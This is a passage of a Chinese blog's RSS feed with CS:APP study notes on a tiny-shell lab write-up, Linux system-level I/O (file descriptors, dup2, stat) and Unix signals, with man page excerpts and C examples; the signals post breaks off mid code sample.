&lt;p&gt;在我的tsh中运行的程序都是tsh程序的子进程,Linux默认fork子进程与父进程同属一个process group,这会导致发送信号&lt;code&gt;kill(-pid,sig)&lt;/code&gt;会发送给整个process group,也就是说,这种情况下,如果我在前台Ctrl-Z/Ctrl-C,我的tsh进程也会暂停/终止,这不是我们期待的结果.解决方法也简单,writeup提示我在子进程中设置&lt;code&gt;setgpid(0, 0)&lt;/code&gt;就可.&lt;/p&gt;
&lt;p&gt;这样,tsh,fg,bg1,bg2,bg3各有不同的pid和gpid:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205152333.png&quot; alt=&quot;&quot;&gt;
tsh的子进程,停止或终止都会给tsh发送SIGCHLD信号,触发&lt;code&gt;sigchld_handler&lt;/code&gt;函数.&lt;/p&gt;
&lt;p&gt;代码中穿插了大量系统调用判断,信号阻塞机制增强原子性,最坑的是这个&lt;code&gt;waitpid&lt;/code&gt;函数的返回状态.&lt;/p&gt;
&lt;p&gt;当我代码大体完成,逐个测试时,test16死活过不去,我真的无语...无奈看看别人的解法[^2][^3].谁能想到, &lt;code&gt;WIFSTOPPED(status)&lt;/code&gt;与&lt;code&gt;WTERMSIG(status)==SIGTSTP&lt;/code&gt;行为似乎不一样,一开始用后者,改为前者及其风格的&lt;code&gt;WIFEXITED(status)&lt;/code&gt;这些就好了...&lt;/p&gt;
&lt;p&gt;[^2]:&lt;a href=&quot;https://blog.csdn.net/weixin_45739365/article/details/113527531&quot;&gt;CSAPP Shell Lab 实验代码+16个test&lt;/a&gt;
[^3]:&lt;a href=&quot;https://blog.liuly.moe/posts/csapp-shell&quot;&gt;CSAPP 之 Shell Lab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Writeup提示我用&lt;code&gt;waitpid&lt;/code&gt;的&lt;code&gt;WNOHANG&lt;/code&gt;,&lt;code&gt;WUNTRACED&lt;/code&gt;选项.我在&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;man 2 waitpid
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;找到了详细的解释:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; WNOHANG
              return immediately if no child has exited.

WUNTRACED
              also return if a child has stopped (but not traced via ptrace(2)).   Sta‐
              tus  for  traced children which have stopped is provided even if this op‐
              tion is not specified.

WCONTINUED (since Linux 2.6.10)
              also return if a stopped child has been resumed by delivery of SIGCONT.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还有&lt;code&gt;kill&lt;/code&gt;函数的第一个参数,不同值具有不同意义,还算挺有意思的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;DESCRIPTION
       The kill() system call can be used to send any signal to any process group or process.

       If pid is positive, then signal sig is sent to the process with the ID specified by pid.

       If pid equals 0, then sig is sent to every process in the process group of the calling process.

       If  pid equals -1, then sig is sent to every process for which the calling process has permission to send
       signals, except for process 1 (init), but see below.

       If pid is less than -1, then sig is sent to every process in the process group whose ID is -pid.

       If sig is 0, then no signal is sent, but existence and permission checks are still performed; this can be
       used  to check for the existence of a process ID or process group ID that the caller is permitted to sig‐
       nal.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;waitfg&lt;/code&gt;函数中,Writeup居然推荐我循环内用&lt;code&gt;sleep&lt;/code&gt;函数,课堂上不是说这样很浪费时间吗,我一度以为自己理解错了.我果断使用了课堂上提到的&lt;code&gt;sigsuspend&lt;/code&gt;函数,提升了效率,算是一个改进吧.&lt;/p&gt;
&lt;p&gt;写代码这种事情难以言说,去我的注释中体会吧...😋&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;源代码见&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/shlab/tsh.c&quot;&gt;tsh.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;结果&lt;/h1&gt;
&lt;p&gt;除了打印的字符串格式不同(这样才显得是我自己写的嘛)外,与&lt;code&gt;tshref&lt;/code&gt;输出结果&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;完全一致&lt;/strong&gt;(激动):&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205143726.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205143737.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205144605.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250205144644.png&quot; alt=&quot;&quot;&gt;
成功实现了一个&lt;em&gt;tiny shell&lt;/em&gt;!&lt;/p&gt;
&lt;h1&gt;感受&lt;/h1&gt;
&lt;p&gt;本次实验的感受又与之前的实验有不同的感受.这次的感受就是:&lt;strong&gt;混乱&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;虽然逻辑不难,但是代码中要注意的细节实在太多了!再过一段时间估计就看不懂为什么那样处理了...&lt;/p&gt;
&lt;p&gt;信号机制错综复杂,gdb调试更没辙,看起来功能一致的不同的宏定义行为甚至不一样!只能一点点试错,参考别人使用的宏定义才改掉了一个离奇的bug.我游离在各种离奇的bug中,勉强修复了我发现的所有bug...&lt;/p&gt;
&lt;p&gt;连一个半成品shell的代码都如此混乱,真的很难想象Linux内核居然是用C语言写成的!😨&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 03 Feb 2025 16:00:00 GMT</pubDate></item><item><title>系统级IO</title><link>https://tankimzeg.top/blog/csapp/system-level-io/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/system-level-io/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/system-level-io/&quot;&gt;https://tankimzeg.top/blog/csapp/system-level-io/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;import Info from &amp;quot;@/components/mdx/Info.astro&amp;quot;;&lt;/p&gt;
&lt;h2&gt;Linux I/O总览&lt;/h2&gt;
&lt;p&gt;Linux文件是字节的序列:$B_{0},B_{1},\dots,B_{k},\dots,B_{m-1}$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一切都以文件形式展现:&lt;ul&gt;
&lt;li&gt;硬盘: /dev/sda2&lt;/li&gt;
&lt;li&gt;终端: /dev/tty2&lt;/li&gt;
&lt;li&gt;内核镜像: /boot/vmlinuz-3.13.0-55-generic&lt;/li&gt;
&lt;li&gt;内核数据结构: /proc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unix I/O函数:&lt;ul&gt;
&lt;li&gt;&lt;code&gt;open()&lt;/code&gt;和&lt;code&gt;close()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;和&lt;code&gt;write()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lseek()&lt;/code&gt;:当前文件的相对偏移量
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203224007.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件类型&lt;ul&gt;
&lt;li&gt;常规文件:包括任意数据&lt;/li&gt;
&lt;li&gt;目录:相关文件组的索引,描述其他文件的位置和索引&lt;/li&gt;
&lt;li&gt;套接字:网络编程&lt;/li&gt;
&lt;li&gt;管道&lt;/li&gt;
&lt;li&gt;链接&lt;/li&gt;
&lt;li&gt;设备&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本课程讨论前三种.&lt;/p&gt;
&lt;h3&gt;常规文件&lt;/h3&gt;
&lt;p&gt;常规文件包含任意数据.
操作系统不管文件内部的内容;有些应用程序区分二进制文件和文本文件.
文本文件只有ASCII或Unicode字符;其他属二进制文件.
不同系统中的换行符:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux和Mac OS: &amp;#39;\n&amp;#39;(0xa)   LF&lt;/li&gt;
&lt;li&gt;Windows和网络协议: &amp;#39;\r\n&amp;#39;(0xd 0xa)   CRLF&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;p&gt;目录包括一个链接的数组.
每个目录至少包括两个元素: .(自身的链接) 和 ..(父目录的链接)
操作目录的命令:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkdir&lt;/code&gt;:创建空目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls&lt;/code&gt;:浏览目录内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rmdir&lt;/code&gt;:删除空目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目录层次结构:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203232107.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;I/O函数&lt;/h3&gt;
&lt;p&gt;我在网络编程的实践中已经接触过Linux的I/O函数,以及Linux一切皆文件的特点.对以下C函数已经熟悉.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;open&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;close&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write&lt;/code&gt;函数
Linux shell创建的进程都有三个初始的&lt;strong&gt;文件描述符&lt;/strong&gt;:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;0: stdin&lt;/li&gt;
&lt;li&gt;1: stdout&lt;/li&gt;
&lt;li&gt;2: stderr
之后创建的文件描述符从3开始增加,有上限.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;文件元数据(Metadata)&lt;/h3&gt;
&lt;p&gt;stat数据结构:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Metadata returned by the stat and fstat functions */ 
struct stat { 
	dev_t st_dev; /* Device */ 
	ino_t st_ino; /* inode */ 
	mode_t st_mode; /* Protection and file type */ 
	nlink_t st_nlink; /* Number of hard links */ 
	uid_t st_uid; /* User ID of owner */ 
	gid_t st_gid; /* Group ID of owner */ 
	dev_t st_rdev; /* Device type (if inode device) */ 
	off_t st_size; /* Total size, in bytes */ 
	unsigned long st_blksize; /* Blocksize for filesystem I/O */ 
	unsigned long st_blocks; /* Number of blocks allocated */ 
	time_t st_atime; /* Time of last access */ 
	time_t st_mtime; /* Time of last modification */ 
	time_t st_ctime; /* Time of last change */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;Info&gt;
我发现Linux中一个好用的命令工具`man`:
 ```shell
 sudo apt upgrade
 sudo apt-get install man-db
 ```
 然后就可以通过`man`查看各种命令,函数,十分详细!
 例如,
 ```
 man 2 stat
 ````
 会出现帮助文档:
 ![](attachments/Pasted%20image%2020250204004534.png)
&lt;/Info&gt;

&lt;h3&gt;打开文件的表示&lt;/h3&gt;
&lt;p&gt;每一个进程都有一个描述符表(Descriptor table),打开某个文件后,该表相应元素的指针指向该文件的数据结构.该数据结构是打开文件表(Open file table)的一个元素,由操作系统进行全局维护.
打开文件表的一个元素包含了该文件的信息:File pos是最后一次读写操作的位置;打开文件可以被所有进程共享,所以引用计数(refcnt)表明它当前的引用次数.v-node是文件的stat.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;两个文件描述符引用两个不同的文件:
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204110451.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;两个文件描述符打开打开同一个文件:
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204111218.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fork&lt;/code&gt;创建子进程,共享open file table
  每个refcnt加1
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204111606.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;I/O重定向&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
int dup2(int oldfd, int newfd);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过调用&lt;code&gt;dup2&lt;/code&gt;函数,复制文件描述符来实现重定向.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204112244.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204113313.png&quot; alt=&quot;&quot;&gt;
在shell中,&lt;code&gt;&amp;lt;&lt;/code&gt; 是输入重定向; &lt;code&gt;&amp;gt;&lt;/code&gt; 是输出重定向.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Attacklab中,我已经用过&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; exploit.txt &amp;gt; exploit-raw.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;这就是将 &lt;code&gt;hex2raw&lt;/code&gt;程序的输入重定向为 &lt;code&gt;exploit.txt&lt;/code&gt;,输出重定向为 &lt;code&gt;exploit-raw.txt&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;Info&gt;
我记得在网络编程的实践中,父进程`close`文件描述符,子进程的该文件还在,必须子进程也`close`才是彻底关闭.而`dup2`减少了oldfd的refcnt,却似乎不会关闭文件.它们的具体实现是如何操作descriptor table 和 open file table的呢?
&lt;/Info&gt;
### 引发复杂的分析
假设fname文件的内容是&quot;abcde&quot;,以下程序的输出结果分别是什么?
```c
/* ffiles1.c */
#include &quot;csapp.h&quot; 
int main(int argc, char *argv[]) { 
	int fd1, fd2, fd3; 
	char c1, c2, c3; 
	char *fname = argv[1]; 
	fd1 = Open(fname, O_RDONLY, 0); 
	fd2 = Open(fname, O_RDONLY, 0); 
	fd3 = Open(fname, O_RDONLY, 0); 
	Dup2(fd2, fd3); 
	Read(fd1, &amp;c1, 1); 
	Read(fd2, &amp;c2, 1); 
	Read(fd3, &amp;c3, 1); 
	printf(&quot;c1 = %c, c2 = %c, c3 = %c\n&quot;, c1, c2, c3); 
	return 0; 
}

&lt;p&gt;/* ffiles2.c */
#include &amp;quot;csapp.h&amp;quot; 
int main(int argc, char *argv[]) { 
	int fd1; 
	int s = getpid() &amp;amp; 0x1; 
	char c1, c2; 
	char &lt;em&gt;fname = argv[1]; 
	fd1 = Open(fname, O_RDONLY, 0); 
	Read(fd1, &amp;amp;c1, 1); 
	if (fork()) { /&lt;/em&gt; Parent &lt;em&gt;/ 
		sleep(s); Read(fd1, &amp;amp;c2, 1); 
		printf(&amp;quot;Parent: c1 = %c, c2 = %c\n&amp;quot;, c1, c2); 
	} else { /&lt;/em&gt; Child */ 
		sleep(1-s); 
		Read(fd1, &amp;amp;c2, 1); 
		printf(&amp;quot;Child: c1 = %c, c2 = %c\n&amp;quot;, c1, c2); 
	} 
	return 0; 
}&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fname的内容是什么?
```c
#include &amp;quot;csapp.h&amp;quot; 
int main(int argc, char *argv[]) { 
	int fd1, fd2, fd3; 
	char *fname = argv[1]; 
	fd1 = Open(fname, O_CREAT|O_TRUNC|O_RDWR, S_IRUSR|S_IWUSR); 
	Write(fd1, &amp;quot;pqrs&amp;quot;, 4); 
	fd3 = Open(fname, O_APPEND|O_WRONLY, 0); 
	Write(fd3, &amp;quot;jklmn&amp;quot;, 5); 
	fd2 = dup(fd1); /* Allocates descriptor */ 
	Write(fd2, &amp;quot;wxyz&amp;quot;, 4); 
	Write(fd3, &amp;quot;ef&amp;quot;, 2); 
	return 0; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;遍历获取目录下的文件名:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;dirent.h&amp;gt;
{ 
	DIR *directory; 
	struct dirent *de; 
	... 
	if (!(directory = opendir(dir_name))) 
		error(&amp;quot;Failed to open directory&amp;quot;); 
	... 
	while (0 != (de = readdir(directory)))
		printf(&amp;quot;Found file: %s\n&amp;quot;, de-&amp;gt;d_name);
	... 
	closedir(directory); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;标准I/O函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;打开/关闭文件: &lt;code&gt;fopen&lt;/code&gt;&amp;amp;&lt;code&gt;fclose&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;读/写字节流: &lt;code&gt;fread&lt;/code&gt;&amp;amp;&lt;code&gt;fwrite&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;读/写行文本: &lt;code&gt;fgets&lt;/code&gt;&amp;amp;&lt;code&gt;fputs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;格式化输入/输出: &lt;code&gt;fscanf&lt;/code&gt;&amp;amp;&lt;code&gt;fprintf&lt;/code&gt;
这些标准I/O函数都有缓冲区&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Unix I/O,标准I/O和自定义I/O函数&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250204114508.png&quot; alt=&quot;&quot;&gt;
通过自定义I/O函数,满足个性化需求.
根据不同场景,选择不同的I/O函数.&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;推荐阅读:《Unix环境高级编程》&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 03 Feb 2025 00:00:00 GMT</pubDate></item><item><title>异常控制流(信号和非局部跳转)</title><link>https://tankimzeg.top/blog/csapp/exceptional-control-flow-ii/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/exceptional-control-flow-ii/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/exceptional-control-flow-ii/&quot;&gt;https://tankimzeg.top/blog/csapp/exceptional-control-flow-ii/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Linux进程层次结构&lt;/h1&gt;
&lt;p&gt;启动系统时创建的第一个进程时init进程,它的PID是1.系统上其他所有进程都是init进程的子进程.
init进程启动后会创建守护进程.然后是登录进程login shell.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203150254.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;信号(Signal)&lt;/h1&gt;
&lt;p&gt;信号是一条信息,通知进程系统中发生了某类事件.
信号是由内核发出的(其他进程可以请求内核发出信号)
信号携带的信息是一个整数ID(1~30).如:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;默认行为&lt;/th&gt;
&lt;th&gt;反映事件&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;SIGINT&lt;/td&gt;
&lt;td&gt;终止&lt;/td&gt;
&lt;td&gt;Ctrl+C&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;SIGKILL&lt;/td&gt;
&lt;td&gt;终止&lt;/td&gt;
&lt;td&gt;kill&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;SIGSEGV&lt;/td&gt;
&lt;td&gt;终止并转储核心&lt;/td&gt;
&lt;td&gt;Segmentation fault&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;SIGALRM&lt;/td&gt;
&lt;td&gt;终止&lt;/td&gt;
&lt;td&gt;计时器信号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;SIGCHLD&lt;/td&gt;
&lt;td&gt;忽略&lt;/td&gt;
&lt;td&gt;子进程停止或终止&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;发送信号&lt;/h2&gt;
&lt;p&gt;内核发送信号的原因:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内核发现某些事件&lt;/li&gt;
&lt;li&gt;另一个进程请求内核传递信号给另一个进程.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内核通过更新目标进程的&lt;strong&gt;上下文&lt;/strong&gt;来实现发送信号的功能.&lt;/p&gt;
&lt;h3&gt;进程组(Process Group)&lt;/h3&gt;
&lt;p&gt;每一个进程属于某一个进程组.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203160042.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getpgrp()&lt;/code&gt;: 获取当前进程的进程组.
&lt;code&gt;setpgid()&lt;/code&gt;: 改变进程的进程组.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;/bin/kill程序能够向进程和进程组发送信号:&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kill -9 24818
&lt;/code&gt;&lt;/pre&gt;
 (向24818进程发送ID 9:SIGKILL信号)&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kill -9 -24817
&lt;/code&gt;&lt;/pre&gt;
 (向进程组24817发送SIGKILL信号).&lt;/li&gt;
&lt;li&gt;keyboard interrupt.
Ctrl+C:向前台进程组的所有进程发送SIGINT(终止)
Ctrl+Z:向前台进程组的所有进程发送SIGSTP(暂停)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;接收信号&lt;/h2&gt;
&lt;p&gt;目标程序接到信号后,以某种方式对信号做出回应.
回应方式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;忽略信号&lt;/li&gt;
&lt;li&gt;终止进程&lt;/li&gt;
&lt;li&gt;捕获信号,然后执行响应的信号处理机制(有点像异常处理[[异常控制流(异常和进程)#异常表]])
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203153948.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假设内核从异常处理中返回,准备将控制权交付给进程p
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203163848.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不要忘了,上下文切换是通过异常来处理的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;内核先计算进程p待处理且未阻塞的信号:
&lt;code&gt;pnb = peding &amp;amp; ~blocked&lt;/code&gt;
如果 &lt;code&gt;pnb==0&lt;/code&gt; ,将控制权交付进程p.
如果 &lt;code&gt;pnb!=0&lt;/code&gt; ,逐个处理非零位的信号,这将引发进程p的信号处理,直到所有非零位处理完成.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!understanding] 
我的理解是,这些信号是在p进程暂停时发来的,在重新运行p前内核要先处理掉这些待处理信号.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;每个信号类型有对应的默认处理行为,为以下几种之一:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;终止&lt;/li&gt;
&lt;li&gt;终止并转储核心&lt;/li&gt;
&lt;li&gt;停止直到SIGCONT继续执行&lt;/li&gt;
&lt;li&gt;忽略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以使用一个叫做&lt;code&gt;signal&lt;/code&gt;的系统调用来修改默认行为:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;handler_t *signal(int signum, handler_t *handler);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数handler的不同值:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SIG_IGN: 忽略signum类型的信号.&lt;/li&gt;
&lt;li&gt;SIG_DFL: 执行signum类型信号的默认行为&lt;/li&gt;
&lt;li&gt;指定的信号处理函数.程序收到signum类型信号后会执行对应的信号处理函数,该信号处理函数返回后程序回到之前的位置继续执行.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;信号处理程序与主程序运行在同一个进程里,是主程序的并发流.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203173014.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203173057.png&quot; alt=&quot;&quot;&gt;
信号处理程序也可以被其他信号处理程序打断,但不能被同种信号打断:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250203173323.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;待处理信号&lt;/h2&gt;
&lt;p&gt;**待处理(pending)**信号:已经由内核发出但还未收到.
任何时候,一种类型的待处理信号只能有一个,多余的忽略.&lt;/p&gt;
&lt;p&gt;进程无法阻止信号的到来,但是可以**阻塞(blocked)**对信号的处理/响应.&lt;/p&gt;
&lt;p&gt;对于每个进程,内核维护一个32位的&lt;strong&gt;待处理/阻塞向量(pending and blocked bit vector)&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pending: 代表待处理信号的集合.
  当k信号传递时,设置第k位;当k信号接收时,清除第k位.(这也是一类待处理信号只有1个的原因)&lt;/li&gt;
&lt;li&gt;blocked: 代表阻塞信号的集合.
  通过&lt;code&gt;sigprocmask&lt;/code&gt;函数设置或清除(signal mask).&lt;ol&gt;
&lt;li&gt;隐式阻塞机制
 内核阻塞正被处理的信号作为待处理信号.例如:
 SIGINT处理函数不能被另一个SIGINT信号打断.&lt;/li&gt;
&lt;li&gt;显示阻塞/解除阻塞
 &lt;code&gt;sigprocmask&lt;/code&gt;函数以及配套的 &lt;code&gt;sigemptyset, sigfullset, sigaddset, sigdelset&lt;/code&gt;.
 用例:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;sigset_t mask, prev_mask; 
sigemptyset(&amp;amp;mask); 
sigaddset(&amp;amp;mask, SIGINT); 

/* Block SIGINT and save previous blocked set */
sigprocmask(SIG_BLOCK, &amp;amp;mask, &amp;amp;prev_mask); 
 {
    /* Code region that will not be interrupted by SIGINT */ 
 }
/* Restore previous blocked set, unblocking SIGINT */ 
sigprocmask(SIG_SETMASK, &amp;amp;prev_mask, NULL);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;安全的信号处理函数&lt;/h2&gt;
&lt;p&gt;信号处理非常复杂,因为它是并发流,涉及并发编程的理解.我现在还不是很理解.
编写安全的信号处理函数的准则:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;G0: Keep your handlers as simple as possible&lt;ul&gt;
&lt;li&gt;如:Set a global flag and return&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Call only async-signal-safe func&amp;amp;ons in your handlers&lt;ul&gt;
&lt;li&gt;printf, sprintf, malloc, and exit are not safe!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Save and restore errno on entry and exit&lt;ul&gt;
&lt;li&gt;So that other handlers don’t overwrite your value of errno&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protect accesses to shared data structures by temporarily blocking all signals.&lt;ul&gt;
&lt;li&gt;To prevent possible corrup;on&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Declare global variables as volatile&lt;ul&gt;
&lt;li&gt;To prevent compiler from storing them in a register&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Declare global flags as volatile sig_atomic_t&lt;ul&gt;
&lt;li&gt;flag: variable that is only read or wriien (e.g. flag = 1, not flag++)&lt;/li&gt;
&lt;li&gt;Flag declared this way does not need to be protected like other globals&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;函数是&lt;strong&gt;异步信号安全&lt;/strong&gt;的,如果它可重入或不能被其他信号打断.(使用 &lt;code&gt;man 7 signal&lt;/code&gt;查看异步信号安全的函数).&lt;/p&gt;
&lt;p&gt;这部分实在难以言说,只好在代码中体会.
父进程通过信号管理子进程的时候存在&amp;quot;竞争&amp;quot;的关系,也就是执行语句的原子性.如果处理信号的语句没有良好的原子性,在处理一半的时候信号传过来了,就会导致不一致的行为.
对比以下代码段:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* procmask1.c */
int main(int argc, char **argv) { 
	int pid; 
	sigset_t mask_all, prev_all; 
	Sigfillset(&amp;amp;mask_all); 
	Signal(SIGCHLD, handler); 
	initjobs(); /* Initialize the job list */ 
	
	while (1) { 
		if ((pid = Fork()) == 0) { /* Child */ 
			Execve(&amp;quot;/bin/date&amp;quot;, argv, NULL); 
		} 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;prev_all); /* Parent */ 
